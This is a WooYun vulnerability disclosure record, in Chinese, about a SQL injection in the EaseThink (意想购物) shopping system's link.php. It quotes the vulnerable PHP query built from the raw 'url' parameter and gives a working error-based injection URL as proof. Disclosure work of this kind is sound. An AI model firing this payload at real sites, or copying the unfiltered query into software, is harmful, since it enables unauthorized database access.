{"id": 11463, "wybug_id": "wooyun-2013-021971", "wybug_title": "意想购物（easethink）SQL注射漏洞", "wybug_corp": "意想购物", "wybug_author": "lxsec", "wybug_date": "2013-04-16 17:39", "wybug_open_date": "2013-07-15 17:40", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "数字类型注射", "源码审核", "注射漏洞利用技巧", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-16：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-07-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 意想购物存在sql注入漏洞 详细说明：  本来是写今天的那个易想购物sql注入漏洞的，找一些request变量看看。发现link页貌似也有过滤不严的错误，就打开代码看看先，果然发现问题了。下面是link.php页面内代码\nif($_REQUEST['act']=='go')  //link标签 go{\t$url = ($_REQUEST['url']);  //直接取了url的值就带入了sql查询语句了\t$link_item = $GLOBALS['db']->getRowCached(\"select * from \".DB_PREFIX.\"link where (url = '\".$url.\"' or url = 'http://\".$url.\"') and is_effect = 1\"); //带入查询了\tif($link_item)\t{\t\tif(check_ipop_limit(get_client_ip(),\"Link\",10,$link_item['id']))\t\t$GLOBALS['db']->query(\"update \".DB_PREFIX.\"link set count = count + 1 where id = \".$link_item['id']);\t\t$url = \"http://\".$url;\t}\telse\t{\t\t$url = APP_ROOT.\"/\";\t}\tapp_redirect($url);}\n看的很清楚吧   漏洞证明：  试试localhost/exptest/easethink/link.php?act=go&city=sanming&url='and(select%201%20from(select%20count(*)%2cconcat((select%20concat(CHAR(52)%2cCHAR(67)%2cCHAR(117)%2cCHAR(68)%2cCHAR(98)%2cCHAR(104)%2cCHAR(67)%2cCHAR(77)%2cCHAR(99)%2cCHAR(77)%2cCHAR(81))%20from%20information_schema.tables%20limit%200%2c1)%2cfloor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)\n\n   修复方案：  对于关键字的过滤   版权声明：转载请注明来源 lxsec@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：13 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 13, "Ranks": null}